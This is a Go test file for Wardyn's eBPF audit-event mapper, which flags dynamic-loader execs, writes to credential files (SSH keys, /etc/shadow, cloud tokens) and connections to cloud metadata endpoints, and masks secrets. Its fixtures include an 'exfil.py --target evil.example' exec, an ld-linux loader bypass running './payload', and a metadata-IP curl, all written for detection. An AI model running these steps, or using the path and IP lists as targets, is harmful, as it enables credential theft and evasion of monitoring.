// Copyright 2025 The Wardyn Authors
// SPDX-License-Identifier: Apache-2.0

package groundtruth

import (
	"bytes"
	"encoding/json"
	"slices"
	"testing"

	"github.com/google/uuid"

	"github.com/cjohnstoniv/wardyn/internal/secretmask"
	"github.com/cjohnstoniv/wardyn/internal/types"
)

// fakeCorrelator maps a fixed set of container ids to run ids.
type fakeCorrelator struct {
	byContainer map[string]uuid.UUID
}

func (f fakeCorrelator) RunForContainer(id string) (uuid.UUID, bool) {
	r, ok := f.byContainer[id]
	return r, ok
}

var (
	knownRun       = uuid.MustParse("11111111-1111-1111-1111-111111111111")
	knownContainer = "abc123def456"
	knownCgroup    = uint64(987654) // no longer used for correlation; still exercised as opaque EventData.CgroupID
)

func mappedCorrelator() fakeCorrelator {
	return fakeCorrelator{
		byContainer: map[string]uuid.UUID{knownContainer: knownRun},
	}
}

// decodeData unmarshals an event's Data into EventData for assertions.
func decodeData(t *testing.T, ev types.AuditEvent) EventData {
	t.Helper()
	var d EventData
	if err := json.Unmarshal(ev.Data, &d); err != nil {
		t.Fatalf("decode data: %v (raw=%s)", err, ev.Data)
	}
	return d
}

func TestIsDynamicLinker(t *testing.T) {
	cases := []struct {
		bin  string
		want bool
	}{
		{"/lib/ld-linux.so.2", true},
		{"/lib64/ld-linux-x86-64.so.2", true},
		{"/lib32/ld-linux.so.2", true},
		{"/usr/lib/ld-linux-aarch64.so.1", true},
		{"/lib/ld-musl-x86_64.so.1", true},
		{"/usr/lib/ld-musl-aarch64.so.1", true},
		{"ld-linux-x86-64.so.2", true}, // bare basename
		{"ld-musl-x86_64.so.1", true},  // bare basename
		{"/usr/bin/python3", false},
		{"/bin/sh", false},
		{"/usr/local/bin/curl", false},
		{"", false},
		{"   ", false},
		{"/usr/bin/ldd", false}, // not a loader despite the prefix
	}
	for _, c := range cases {
		if got := IsDynamicLinker(c.bin); got != c.want {
			t.Errorf("IsDynamicLinker(%q) = %v, want %v", c.bin, got, c.want)
		}
	}
}

func TestIsSensitivePath(t *testing.T) {
	cases := []struct {
		path string
		want bool
	}{
		{"/home/agent/.ssh/id_rsa", true},
		{"/root/.ssh/authorized_keys", true},
		{"/etc/passwd", true},
		{"/etc/shadow", true},
		{"/home/user/.aws/credentials", true},
		{"/home/user/.config/gcloud/access_tokens.db", true},
		{"/home/user/.kube/config", true},
		{"/workspace/repo/.git/config", true},
		{"/home/agent/.gitconfig", true},
		{"/home/agent/.git-credentials", true},
		{"/home/agent/.netrc", true},
		{"/home/agent/.npmrc", true},
		{"/var/run/secrets/kubernetes.io/serviceaccount/token", true},
		{"/run/secrets/my-secret", true},
		{"/opt/keys/server.pem", true},
		{"/opt/app/tls.key", true},
		{"/home/agent/service-account.json", true},
		{"/home/agent/.docker/config.json", true},
		// Non-sensitive (filtered).
		{"/tmp/build.log", false},
		{"/workspace/repo/main.go", false},
		{"/home/agent/output.txt", false},
		{"/usr/share/doc/readme", false},
		{"", false},
		{"   ", false},
	}
	for _, c := range cases {
		if got := IsSensitivePath(c.path); got != c.want {
			t.Errorf("IsSensitivePath(%q) = %v, want %v", c.path, got, c.want)
		}
	}
}

func TestMapProcessExec(t *testing.T) {
	m := NewMapper(mappedCorrelator())

	// Sample Tetragon JSON for a mapped, ordinary exec.
	line := []byte(`{
		"process_exec": {
			"process": {
				"binary": "/usr/bin/python3",
				"arguments": "exfil.py --target evil.example",
				"docker": "abc123def456",
				"cgroup_id": "987654",
				"pod": null
			},
			"parent": {"binary": "/bin/bash"}
		}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("expected exec to map")
	}
	if ev.Action != ActionProcessExec {
		t.Errorf("action = %q, want %q", ev.Action, ActionProcessExec)
	}
	if ev.ActorType != types.ActorSystem || ev.Actor != SensorActor {
		t.Errorf("actor = %s/%s, want system/%s", ev.ActorType, ev.Actor, SensorActor)
	}
	if ev.RunID == nil || *ev.RunID != knownRun {
		t.Errorf("run id = %v, want %v", ev.RunID, knownRun)
	}
	if ev.Target != "/usr/bin/python3" {
		t.Errorf("target = %q, want the binary", ev.Target)
	}
	if ev.Outcome != "success" {
		t.Errorf("outcome = %q, want success", ev.Outcome)
	}
	d := decodeData(t, ev)
	if d.Stream != Stream {
		t.Errorf("stream = %q, want %q", d.Stream, Stream)
	}
	if d.Subtype != SubtypeProcessExec {
		t.Errorf("subtype = %q, want %q", d.Subtype, SubtypeProcessExec)
	}
	if d.Correlation != CorrelationMapped {
		t.Errorf("correlation = %q, want mapped", d.Correlation)
	}
	if d.Loader {
		t.Error("python3 should not be flagged as a loader")
	}
	// The sensor sends the arguments whole; the control plane splits them onto
	// argv once they are masked (MaskData), into the same words as ever.
	if !slices.Equal(d.Argv, []string{"/usr/bin/python3"}) || d.Arguments != "exfil.py --target evil.example" {
		t.Errorf("argv = %q, arguments = %q, want the binary and the raw arguments whole", d.Argv, d.Arguments)
	}
	var done EventData
	if err := json.Unmarshal(MaskData(ev.Data, asIs, asIs), &done); err != nil {
		t.Fatalf("decode finished data: %v", err)
	}
	if wantArgv := []string{"/usr/bin/python3", "exfil.py", "--target", "evil.example"}; !slices.Equal(done.Argv, wantArgv) || done.Arguments != "" {
		t.Errorf("finished argv = %q, arguments = %q, want %q and none", done.Argv, done.Arguments, wantArgv)
	}
	if d.CgroupID != knownCgroup {
		t.Errorf("cgroup_id = %d, want %d", d.CgroupID, knownCgroup)
	}
	if d.ContainerID != knownContainer {
		t.Errorf("container_id = %q, want %q", d.ContainerID, knownContainer)
	}
}

func TestMapProcessExec_LoaderFlag(t *testing.T) {
	m := NewMapper(mappedCorrelator())

	// The ld-linux/mmap bypass: invoking the loader directly to run a payload
	// the execve hook never named. We must FLAG it (loader=true), not block it.
	line := []byte(`{
		"process_exec": {
			"process": {
				"binary": "/lib64/ld-linux-x86-64.so.2",
				"arguments": "./payload",
				"docker": "abc123def456",
				"cgroup_id": "987654"
			}
		}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("expected loader exec to map")
	}
	d := decodeData(t, ev)
	if !d.Loader {
		t.Error("ld-linux exec must be flagged loader=true (ld-linux/mmap bypass surface)")
	}
	// Loader exec is still recorded with success outcome (detection, not block).
	if ev.Outcome != "success" {
		t.Errorf("outcome = %q, want success (we detect, never block)", ev.Outcome)
	}
}

func TestMapProcessExec_LoaderInArgv(t *testing.T) {
	m := NewMapper(mappedCorrelator())
	// Loader invoked by basename as argv[0] via a wrapper. Flag it too.
	line := []byte(`{
		"process_exec": {
			"process": {
				"binary": "/bin/sh",
				"arguments": "-c ld-musl-x86_64.so.1 ./payload",
				"docker": "abc123def456"
			}
		}
	}`)
	ev, _ := m.MapLine(line)
	d := decodeData(t, ev)
	// argv[0] is /bin/sh; the loader is deeper. We only flag argv[0]/binary, so
	// this stays false — documenting the limit: a shell-wrapped loader is not
	// caught by the argv[0] heuristic (the binary field is authoritative).
	if d.Loader {
		t.Error("shell-wrapped loader is not flagged via argv[0] heuristic (documented limit)")
	}
}

// TestMapProcessExec_CgroupIDQuotedString locks down FINDING Tetragon's
// protojson export renders proto uint64 fields (cgroup_id) as JSON STRINGS,
// e.g. "cgroup_id":"987654", never a bare number. Before CgroupID's tag
// carried ,string, json.Unmarshal returned an UnmarshalTypeError on that one
// field and MapLine dropped the ENTIRE line (types.AuditEvent{}, false) —
// silently blinding every real exec/kprobe event with a nonzero cgroup id, not
// merely losing the cgroup id itself.
func TestMapProcessExec_CgroupIDQuotedString(t *testing.T) {
	m := NewMapper(mappedCorrelator())
	// Real Tetragon protojson output quotes 64-bit integer fields.
	line := []byte(`{
		"process_exec": {
			"process": {
				"binary": "/usr/bin/python3",
				"docker": "abc123def456",
				"cgroup_id": "987654"
			}
		}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("expected exec with protojson-shaped (quoted) cgroup_id to map, not be silently dropped")
	}
	if d := decodeData(t, ev); d.CgroupID != knownCgroup {
		t.Errorf("cgroup_id = %d, want %d", d.CgroupID, knownCgroup)
	}
}

// TestMapNetworkConnect covers the DOCUMENTED Tetragon export shape for a TCP
// connect. Tetragon has NO top-level "process_connect" event kind (the
// GetEventsResponse oneof is process_exec / process_exit / process_kprobe /
// process_tracepoint / process_uprobe / process_lsm / ...). A connect is
// observed via a process_kprobe on a connect kprobe (tcp_connect /
// security_socket_connect / __sys_connect) whose socket argument is a sock_arg
// (KprobeSock) with daddr/dport. Keying off a fictional kind would mean live
// escape/connect detection never fires.
func TestMapNetworkConnect(t *testing.T) {
	m := NewMapper(mappedCorrelator())

	// Ordinary outbound connect (public IP) via a tcp_connect kprobe.
	line := []byte(`{
		"process_kprobe": {
			"process": {"binary": "/usr/bin/curl", "docker": "abc123def456", "cgroup_id": "987654"},
			"function_name": "tcp_connect",
			"args": [{"sock_arg": {"family": "AF_INET", "protocol": "IPPROTO_TCP", "saddr": "172.17.0.2", "daddr": "93.184.216.34", "sport": 51000, "dport": 443}}]
		}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("expected connect to map")
	}
	if ev.Action != ActionNetworkConnect {
		t.Errorf("action = %q, want %q", ev.Action, ActionNetworkConnect)
	}
	if ev.Outcome != "success" {
		t.Errorf("outcome = %q, want success for a public dst", ev.Outcome)
	}
	d := decodeData(t, ev)
	if d.Dst != "93.184.216.34:443" {
		t.Errorf("dst = %q, want 93.184.216.34:443 (from sock_arg daddr/dport)", d.Dst)
	}
	if d.Subtype != SubtypeNetworkConnect {
		t.Errorf("subtype = %q, want %q", d.Subtype, SubtypeNetworkConnect)
	}
}

// TestMapNetworkConnect_Kind covers every connect-hook function name the mapper
// recognises, against the documented sock_arg shape.
func TestMapNetworkConnect_Kind(t *testing.T) {
	for _, fn := range []string{"tcp_connect", "security_socket_connect", "__sys_connect", "__x64_sys_connect", "sys_connect"} {
		t.Run(fn, func(t *testing.T) {
			m := NewMapper(mappedCorrelator())
			line := []byte(`{
				"process_kprobe": {
					"process": {"binary": "/usr/bin/curl", "docker": "abc123def456"},
					"function_name": "` + fn + `",
					"args": [{"sock_arg": {"daddr": "93.184.216.34", "dport": 443}}]
				}
			}`)
			ev, ok := m.MapLine(line)
			if !ok {
				t.Fatalf("expected connect kprobe (%s) to map", fn)
			}
			if ev.Action != ActionNetworkConnect {
				t.Errorf("action = %q, want %q", ev.Action, ActionNetworkConnect)
			}
			if decodeData(t, ev).Dst != "93.184.216.34:443" {
				t.Errorf("dst = %q, want 93.184.216.34:443", decodeData(t, ev).Dst)
			}
		})
	}
}

func TestMapNetworkConnect_MetadataIsFailure(t *testing.T) {
	m := NewMapper(mappedCorrelator())
	// A connect to the cloud metadata IP is an escape signal -> outcome failure.
	line := []byte(`{
		"process_kprobe": {
			"process": {"binary": "/usr/bin/curl", "docker": "abc123def456"},
			"function_name": "security_socket_connect",
			"args": [{"sock_arg": {"daddr": "169.254.169.254", "dport": 80}}]
		}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("expected connect to map")
	}
	if ev.Outcome != "failure" {
		t.Errorf("outcome = %q, want failure for metadata IP", ev.Outcome)
	}
	d := decodeData(t, ev)
	if d.Dst != "169.254.169.254:80" {
		t.Errorf("dst = %q, want metadata addr", d.Dst)
	}
}

// Every cloud metadata or credential endpoint the guards know is flagged, not
// only the IPv4 metadata address.
func TestIsMetadataIP_SharedSet(t *testing.T) {
	for _, ip := range []string{"169.254.169.254", "::ffff:169.254.169.254", "169.254.170.2", "169.254.170.23",
		"fd00:ec2::254", "fd00:ec2::23", "fd20:ce::254", "100.100.100.200"} {
		if !isMetadataIP(ip) {
			t.Errorf("isMetadataIP(%s) = false, want true", ip)
		}
	}
	for _, ip := range []string{"172.17.0.2", "10.0.0.1", "fd00::1", "93.184.216.34", "", "not-an-ip"} {
		if isMetadataIP(ip) {
			t.Errorf("isMetadataIP(%q) = true, want false", ip)
		}
	}
}

// TestMapNetworkConnect_PrivateProxyIsNotFailure locks down FIX #17: under the
// primary L0 topology (Internal + gatewayless) the agent's SOLE legal dst is
// wardyn-proxy on a PRIVATE bridge IP. The old mapper stamped any private dst
// "failure" via an IP-class guess, so every legitimate agent->proxy connect was
// a false escape alert. A private dst must now map to "success" (the connect
// happened; downstream policy — not this target-agnostic mapper — decides).
func TestMapNetworkConnect_PrivateProxyIsNotFailure(t *testing.T) {
	m := NewMapper(mappedCorrelator())
	line := []byte(`{
		"process_kprobe": {
			"process": {"binary": "/usr/bin/curl", "docker": "abc123def456"},
			"function_name": "tcp_connect",
			"args": [{"sock_arg": {"daddr": "172.18.0.2", "dport": 8080}}]
		}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("expected connect to map")
	}
	if ev.Outcome != "success" {
		t.Errorf("outcome = %q, want success for the private proxy dst (not a false escape flag)", ev.Outcome)
	}
	if d := decodeData(t, ev); d.Dst != "172.18.0.2:8080" {
		t.Errorf("dst = %q, want 172.18.0.2:8080", d.Dst)
	}
}

func TestMapFileWrite_Sensitive(t *testing.T) {
	m := NewMapper(mappedCorrelator())
	// A write to ~/.ssh via a security_file_permission kprobe, as the shipped
	// policy hooks it: the file, the MAY_WRITE access mask, and a 0 return.
	line := []byte(`{
		"process_kprobe": {
			"process": {"binary": "/usr/bin/python3", "docker": "abc123def456", "cgroup_id": "987654"},
			"function_name": "security_file_permission",
			"args": [{"file_arg": {"path": "/home/agent/.ssh/id_rsa"}}, {"int_arg": 2}],
			"return": {"int_arg": 0}
		}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("expected sensitive file write to map")
	}
	if ev.Action != ActionFileWrite {
		t.Errorf("action = %q, want %q", ev.Action, ActionFileWrite)
	}
	d := decodeData(t, ev)
	if d.Path != "/home/agent/.ssh/id_rsa" {
		t.Errorf("path = %q, want the ssh key path", d.Path)
	}
	if d.Subtype != SubtypeFileWrite {
		t.Errorf("subtype = %q, want %q", d.Subtype, SubtypeFileWrite)
	}
	if ev.Target != "/home/agent/.ssh/id_rsa" {
		t.Errorf("target = %q, want the path", ev.Target)
	}
	if ev.Outcome != "success" {
		t.Errorf("outcome = %q, want success for a permitted write", ev.Outcome)
	}
}

func TestMapFileWrite_NonSensitiveFiltered(t *testing.T) {
	m := NewMapper(mappedCorrelator())
	// A write to an ordinary file is FILTERED (ok=false): noise, not signal.
	line := []byte(`{
		"process_kprobe": {
			"process": {"binary": "/usr/bin/python3", "docker": "abc123def456"},
			"function_name": "security_file_permission",
			"args": [{"file_arg": {"path": "/workspace/repo/main.go"}}, {"int_arg": 2}],
			"return": {"int_arg": 0}
		}
	}`)
	if _, ok := m.MapLine(line); ok {
		t.Error("non-sensitive write should be filtered (ok=false)")
	}
}

func TestMapFileWrite_PathArgAndStringArg(t *testing.T) {
	m := NewMapper(mappedCorrelator())
	// path_arg shape.
	ev, ok := m.MapLine([]byte(`{
		"process_kprobe": {
			"process": {"docker": "abc123def456"},
			"function_name": "security_file_permission",
			"args": [{"path_arg": {"path": "/etc/sudoers"}}, {"int_arg": 2}],
			"return": {"int_arg": 0}
		}
	}`))
	if !ok || decodeData(t, ev).Path != "/etc/sudoers" {
		t.Errorf("path_arg shape not handled: ok=%v ev=%+v", ok, ev)
	}
	// string_arg shape.
	ev, ok = m.MapLine([]byte(`{
		"process_kprobe": {
			"process": {"docker": "abc123def456"},
			"function_name": "security_file_permission",
			"args": [{"string_arg": "/root/.aws/credentials"}, {"int_arg": 2}],
			"return": {"int_arg": 0}
		}
	}`))
	if !ok || decodeData(t, ev).Path != "/root/.aws/credentials" {
		t.Errorf("string_arg shape not handled: ok=%v ev=%+v", ok, ev)
	}
}

// TestMapKprobe_KnownSemanticsOnly: a kprobe maps only from a hook whose
// meaning the mapper knows. An operator's own policy can hook reads, opens and
// receives on the same sensitive paths and sockets; none of them is a write or a
// connect, and a write is claimed only when the kernel let it through.
func TestMapKprobe_KnownSemanticsOnly(t *testing.T) {
	const ssh = `{"file_arg": {"path": "/home/agent/.ssh/id_rsa"}}`
	const sock = `{"sock_arg": {"daddr": "93.184.216.34", "dport": 443}}`
	for name, tc := range map[string]struct {
		fn, args, ret string
		want          string // the action, or "" for dropped
	}{
		"permitted write":            {"security_file_permission", ssh + `, {"int_arg": 2}`, `{"int_arg": 0}`, ActionFileWrite},
		"read and write":             {"security_file_permission", ssh + `, {"int_arg": 6}`, `{"int_arg": 0}`, ActionFileWrite},
		"write and append":           {"security_file_permission", ssh + `, {"int_arg": 10}`, `{"int_arg": 0}`, ActionFileWrite},
		"write with an empty return": {"security_file_permission", ssh + `, {"int_arg": 2}`, `{}`, ""},
		"connect hook":               {"tcp_connect", sock, "", ActionNetworkConnect},
		"connect hook with no sock":  {"tcp_connect", "", "", ActionNetworkConnect},
		"read of a sensitive file":   {"security_file_permission", ssh + `, {"int_arg": 4}`, `{"int_arg": 0}`, ""},
		"open of a sensitive file":   {"security_file_open", ssh + `, {"int_arg": 2}`, `{"int_arg": 0}`, ""},
		"refused write":              {"security_file_permission", ssh + `, {"int_arg": 2}`, `{"int_arg": -13}`, ""},
		"write with no return value": {"security_file_permission", ssh + `, {"int_arg": 2}`, "", ""},
		"write with no access mask":  {"security_file_permission", ssh, `{"int_arg": 0}`, ""},
		"receive with a socket":      {"tcp_recvmsg", sock, "", ""},
		"unknown hook, write shape":  {"some_unknown_hook", ssh + `, {"int_arg": 2}`, `{"int_arg": 0}`, ""},
		"no hook name, a path":       {"", ssh, "", ""},
	} {
		t.Run(name, func(t *testing.T) {
			k := map[string]any{"process": map[string]any{"binary": "/usr/bin/python3", "docker": knownContainer},
				"function_name": tc.fn, "args": json.RawMessage(`[` + tc.args + `]`)}
			if tc.ret != "" {
				k["return"] = json.RawMessage(tc.ret)
			}
			line, _ := json.Marshal(map[string]any{"process_kprobe": k})
			ev, ok := NewMapper(mappedCorrelator()).MapLine(line)
			if tc.want == "" {
				if ok {
					t.Fatalf("mapped to %s/%s, want dropped", ev.Action, ev.Outcome)
				}
				return
			}
			if !ok || ev.Action != tc.want || ev.Outcome != "success" {
				t.Fatalf("ok=%v action=%q outcome=%q, want %s/success", ok, ev.Action, ev.Outcome, tc.want)
			}
		})
	}
}

// TestMaskData_SpaceSecretMaskedBeforeSplit: a registered secret containing a
// space, passed as one argument, is hidden on the recorded argv. The sensor
// sends the raw arguments whole and the run's masker hides the secret before
// the split; splitting first leaves two words that no longer match it. Every
// argument that is not the secret stays readable. A tab only the whole
// arguments keep: an older sensor's words are rejoined with spaces.
func TestMaskData_SpaceSecretMaskedBeforeSplit(t *testing.T) {
	for _, secret := range []string{"alphaBravo charlieDelta", "alphaBravo\tcharlieDelta"} {
		reg := secretmask.NewRegistry()
		if err := reg.Add(knownRun, []byte(secret)); err != nil {
			t.Fatalf("register secret: %v", err)
		}
		line, _ := json.Marshal(map[string]any{"process_exec": map[string]any{"process": map[string]any{
			"binary": "/usr/bin/mysql", "docker": "abc123def456",
			"arguments": "--user app --password=" + secret + " --host db"}}})
		ev, ok := NewMapper(mappedCorrelator()).MapLine(line)
		if !ok || ev.RunID == nil {
			t.Fatalf("exec did not map to its run: ok=%v run=%v", ok, ev.RunID)
		}
		mask := reg.JSONVariantMasker(*ev.RunID).Mask
		data := MaskData(ev.Data, mask, mask)
		for _, word := range []string{"alphaBravo", "charlieDelta"} {
			if bytes.Contains(data, []byte(word)) {
				t.Errorf("%q: recorded data carries %q: %s", secret, word, data)
			}
		}
		var d EventData
		if err := json.Unmarshal(data, &d); err != nil {
			t.Fatalf("decode masked data: %v (raw=%s)", err, data)
		}
		want := []string{"/usr/bin/mysql", "--user", "app", "--password=<secret-hidden>", "--host", "db"}
		if !slices.Equal(d.Argv, want) || d.Arguments != "" {
			t.Errorf("%q: argv = %q, arguments = %q, want %q and none", secret, d.Argv, d.Arguments, want)
		}
	}
}

// asIs is a mask that hides nothing.
func asIs(b []byte) []byte { return b }

// TestMaskData_ArgumentsWithheld: a caller that cannot vouch for the secrets it
// holds hands back a placeholder for the raw arguments. None of their words
// reaches argv, where no later masking could rejoin them; the binary stays.
func TestMaskData_ArgumentsWithheld(t *testing.T) {
	data := EventData{Stream: Stream, Subtype: SubtypeProcessExec, Argv: []string{"/usr/bin/mysql"},
		Arguments: "--password=alphaBravo charlieDelta --host db"}.marshal()
	var d EventData
	if err := json.Unmarshal(MaskData(data, asIs, func([]byte) []byte { return secretmask.Placeholder() }), &d); err != nil {
		t.Fatalf("decode withheld data: %v", err)
	}
	if want := []string{"/usr/bin/mysql", "<secret-hidden>"}; !slices.Equal(d.Argv, want) || d.Arguments != "" {
		t.Errorf("argv = %q, arguments = %q, want %q and none", d.Argv, d.Arguments, want)
	}
}

// TestMaskData_OlderSensorSplitArgv: a sensor older than the server sends the
// arguments already split onto argv. The words are joined back before the
// mask, so a secret whose whitespace is a single space is still hidden, and
// withheld like raw arguments when the caller cannot vouch for its secrets.
func TestMaskData_OlderSensorSplitArgv(t *testing.T) {
	reg := secretmask.NewRegistry()
	if err := reg.Add(knownRun, []byte("alphaBravo charlieDelta")); err != nil {
		t.Fatalf("register secret: %v", err)
	}
	mask := reg.JSONVariantMasker(knownRun).Mask
	data := EventData{Stream: Stream, Subtype: SubtypeProcessExec,
		Argv: []string{"/usr/bin/mysql", "--user", "app", "--password=alphaBravo", "charlieDelta", "--host", "db"}}.marshal()
	for name, tc := range map[string]struct {
		maskArgs func([]byte) []byte
		want     []string
	}{
		"masked":   {mask, []string{"/usr/bin/mysql", "--user", "app", "--password=<secret-hidden>", "--host", "db"}},
		"withheld": {func([]byte) []byte { return secretmask.Placeholder() }, []string{"/usr/bin/mysql", "<secret-hidden>"}},
	} {
		var d EventData
		if err := json.Unmarshal(MaskData(data, mask, tc.maskArgs), &d); err != nil {
			t.Fatalf("%s: decode masked data: %v", name, err)
		}
		if !slices.Equal(d.Argv, tc.want) || d.Arguments != "" {
			t.Errorf("%s: argv = %q, arguments = %q, want %q and none", name, d.Argv, d.Arguments, tc.want)
		}
	}
}

// TestMaskData_MasksEveryField: a secret outside the raw arguments is hidden
// too, on an exec's binary and on an event that carries no arguments at all.
func TestMaskData_MasksEveryField(t *testing.T) {
	reg := secretmask.NewRegistry()
	if err := reg.Add(knownRun, []byte("echoFoxtrotGolf")); err != nil {
		t.Fatalf("register secret: %v", err)
	}
	mask := reg.JSONVariantMasker(knownRun).Mask
	for name, d := range map[string]EventData{
		"exec binary": {Stream: Stream, Subtype: SubtypeProcessExec, Argv: []string{"/opt/echoFoxtrotGolf/tool"}, Arguments: "run"},
		"write path":  {Stream: Stream, Subtype: SubtypeFileWrite, Path: "/home/agent/.ssh/echoFoxtrotGolf"},
	} {
		if out := MaskData(d.marshal(), mask, mask); bytes.Contains(out, []byte("echoFoxtrotGolf")) || !bytes.Contains(out, []byte("<secret-hidden>")) {
			t.Errorf("%s: masked data = %s, want the secret hidden", name, out)
		}
	}
	if out := MaskData([]byte(`{"argv":"echoFoxtrotGolf"}`), mask, mask); bytes.Contains(out, []byte("echoFoxtrotGolf")) {
		t.Errorf("undecodable data = %s, want the secret hidden", out)
	}
}

func TestMapUnmapped_RunIDNull(t *testing.T) {
	// A container the correlator does not know -> run_id NULL, unmapped, never
	// silently dropped (ok stays true). Blindness must be visible.
	m := NewMapper(mappedCorrelator())
	line := []byte(`{
		"process_exec": {
			"process": {"binary": "/usr/bin/wget", "docker": "UNKNOWNcontainer", "cgroup_id": "555"}
		}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("unmapped event must STILL be emitted (visible blindness), not dropped")
	}
	if ev.RunID != nil {
		t.Errorf("run id = %v, want nil for unmapped", ev.RunID)
	}
	d := decodeData(t, ev)
	if d.Correlation != CorrelationUnmapped {
		t.Errorf("correlation = %q, want unmapped", d.Correlation)
	}
}

func TestMapUnmapped_NilCorrelator(t *testing.T) {
	// A nil Correlator must not panic; everything is unmapped.
	m := NewMapper(nil)
	ev, ok := m.MapLine([]byte(`{"process_exec":{"process":{"binary":"/bin/sh","docker":"x"}}}`))
	if !ok {
		t.Fatal("expected emit with nil correlator")
	}
	if ev.RunID != nil {
		t.Errorf("run id = %v, want nil with nil correlator", ev.RunID)
	}
	if decodeData(t, ev).Correlation != CorrelationUnmapped {
		t.Error("want unmapped with nil correlator")
	}
}

func TestMapUnmapped_CgroupOnlyNoLongerCorrelates(t *testing.T) {
	// Container-id correlation is the sole (authoritative) path: a process with
	// no docker id is unmapped even when its cgroup id would have resolved
	// under the removed cgroup-fallback index.
	m := NewMapper(mappedCorrelator())
	line := []byte(`{
		"process_exec": {"process": {"binary": "/bin/sh", "cgroup_id": "987654"}}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("unmapped event must still be emitted (visible blindness), not dropped")
	}
	if ev.RunID != nil {
		t.Errorf("run id = %v, want nil (cgroup-only no longer correlates)", ev.RunID)
	}
	if decodeData(t, ev).Correlation != CorrelationUnmapped {
		t.Error("want unmapped for a cgroup-only process")
	}
}

func TestMapUnknownKind(t *testing.T) {
	m := NewMapper(mappedCorrelator())
	// A Tetragon event kind we do not record -> ok=false.
	if _, ok := m.MapLine([]byte(`{"process_exit": {"process": {"binary": "/bin/sh"}}}`)); ok {
		t.Error("unknown event kind should not map (ok=false)")
	}
	// Garbage JSON -> ok=false, no panic.
	if _, ok := m.MapLine([]byte(`{not json`)); ok {
		t.Error("garbage JSON should not map")
	}
	// Empty event.
	if _, ok := m.MapLine([]byte(`{}`)); ok {
		t.Error("empty event should not map")
	}
}

func TestHeartbeatEventWithDropped(t *testing.T) {
	ev := HeartbeatEventWithDropped(3, 7, 11, map[string]uint64{ActionProcessExec: 7})
	if ev.Action != ActionSensorHeartbeat {
		t.Errorf("action = %q, want %q", ev.Action, ActionSensorHeartbeat)
	}
	if ev.RunID != nil {
		t.Errorf("heartbeat run id = %v, want nil (host-scoped)", ev.RunID)
	}
	if ev.ActorType != types.ActorSystem || ev.Actor != SensorActor {
		t.Errorf("actor = %s/%s, want system/%s", ev.ActorType, ev.Actor, SensorActor)
	}
	if ev.Outcome != "success" {
		t.Errorf("outcome = %q, want success", ev.Outcome)
	}
	d := decodeData(t, ev)
	if d.Stream != Stream {
		t.Errorf("stream = %q, want ebpf", d.Stream)
	}
	// dropped_total and observed_total must be carried on the heartbeat data so
	// /healthz can tell a blind sensor (observed==0) apart from one where events
	// flow.
	var hb struct {
		DroppedTotal    uint64            `json:"dropped_total"`
		ObservedTotal   uint64            `json:"observed_total"`
		DroppedUnmapped uint64            `json:"dropped_unmapped"`
		ObservedByKind  map[string]uint64 `json:"observed_by_kind"`
	}
	if err := json.Unmarshal(ev.Data, &hb); err != nil {
		t.Fatalf("decode heartbeat data: %v", err)
	}
	if hb.DroppedTotal != 3 {
		t.Errorf("dropped_total = %d, want 3", hb.DroppedTotal)
	}
	if hb.ObservedTotal != 7 {
		t.Errorf("observed_total = %d, want 7", hb.ObservedTotal)
	}
	if hb.ObservedByKind[ActionProcessExec] != 7 {
		t.Errorf("observed_by_kind[%s] = %d, want 7", ActionProcessExec, hb.ObservedByKind[ActionProcessExec])
	}
	// dropped_unmapped separates a BLIND sensor from a broken CORRELATION: both
	// read observed_total==0 without it.
	if hb.DroppedUnmapped != 11 {
		t.Errorf("dropped_unmapped = %d, want 11", hb.DroppedUnmapped)
	}
}

func TestBlindEvent(t *testing.T) {
	ev := BlindEvent(knownRun, "")
	if ev.Action != ActionSensorBlind {
		t.Errorf("action = %q, want %q", ev.Action, ActionSensorBlind)
	}
	if ev.RunID == nil || *ev.RunID != knownRun {
		t.Errorf("blind run id = %v, want %v (gap is attributable)", ev.RunID, knownRun)
	}
	if ev.Outcome != "failure" {
		t.Errorf("outcome = %q, want failure (coverage gap is degraded)", ev.Outcome)
	}
	d := decodeData(t, ev)
	if d.Reason != "cc3-kata-host-ebpf-blind" {
		t.Errorf("reason = %q, want default cc3-kata-host-ebpf-blind", d.Reason)
	}
}

func TestAllActionsHaveKernelPrefix(t *testing.T) {
	// Invariant the control-plane endpoint enforces: every action this stream
	// emits carries the kernel. prefix.
	actions := []string{
		ActionProcessExec, ActionNetworkConnect, ActionFileWrite,
		ActionSensorHeartbeat, ActionSensorBlind,
	}
	for _, a := range actions {
		if len(a) < len(KernelActionPrefix) || a[:len(KernelActionPrefix)] != KernelActionPrefix {
			t.Errorf("action %q lacks the %q prefix", a, KernelActionPrefix)
		}
	}
}
